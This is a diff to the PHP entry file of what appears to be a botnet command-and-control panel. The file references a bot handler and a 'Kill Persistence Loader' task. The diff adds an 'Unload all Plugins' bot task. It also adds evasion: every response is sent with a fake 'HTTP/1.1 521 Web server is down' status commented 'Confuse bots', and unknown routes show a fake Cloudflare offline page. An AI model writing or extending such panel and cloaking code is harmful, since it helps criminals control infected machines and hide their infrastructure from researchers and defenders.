@@ -1,5 +1,5 @@
 <?php
-
+header('HTTP/1.1 521 Web server is down'); // Confuse bots
 session_start();
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
@@ -54,8 +54,7 @@ require __DIR__ . '/src/Controllers/Public/BotHandler.class.php';
 require __DIR__ . '/src/Controllers/Public/Install.class.php';
 require __DIR__ . '/src/Controllers/Public/Update.class.php';
 require __DIR__ . '/src/Controllers/Public/Recovery.class.php';
-//require __DIR__ . '/src/Controllers/Public/OrderApi.class.php';
-
+require __DIR__ . '/src/Controllers/Public/FakeErrors.class.php';
 $tpl = new Smarty;
 $router = new \Bramus\Router\Router();
 if (!$installer) {
@@ -82,6 +81,11 @@ $task_configuration = array(
     "killpersistence" => array(
         "name" => "Kill Persistence Loader",
         "command" => "killpersistence",
+    ),
+    "unloadplugins" => array(
+        "name" => "Unload all Plugins",
+        "command" => "unloadplugins",
+        "value" => "unloadplugins",
     ),
 );
 
@@ -126,6 +130,14 @@ foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginN
 
 $template = explode("@", $router->fn);
 
+$router->set404(function() {
+    $cl = new FakeErrors();
+    $cl->cloudflare_offlinehost();
+    $GLOBALS["tpl"]->assign("includeDir", "/versions/".$GLOBALS["loadedVersion"]."/templates/".$GLOBALS["config"]["template"]."/");
+    $GLOBALS["tpl"]->setTemplateDir(__DIR__ . "/templates/".$GLOBALS["config"]["template"]."/");
+    $templateDir = $GLOBALS["template"][0] . "/" . $GLOBALS["template"][1] . ".tpl";
+    $GLOBALS["tpl"]->display($templateDir);
+});
 
 $router->run(function () use ($tpl) {
 
@@ -145,6 +157,7 @@ $router->run(function () use ($tpl) {
         $GLOBALS["tpl"]->assign("task_configuration", $GLOBALS["task_configuration"]);
         $GLOBALS["tpl"]->assign("pluginSetting_Tabs", $GLOBALS["pluginSetting_Tabs"]);
     }
+
     $tpl->display($templateDir);
 });
 
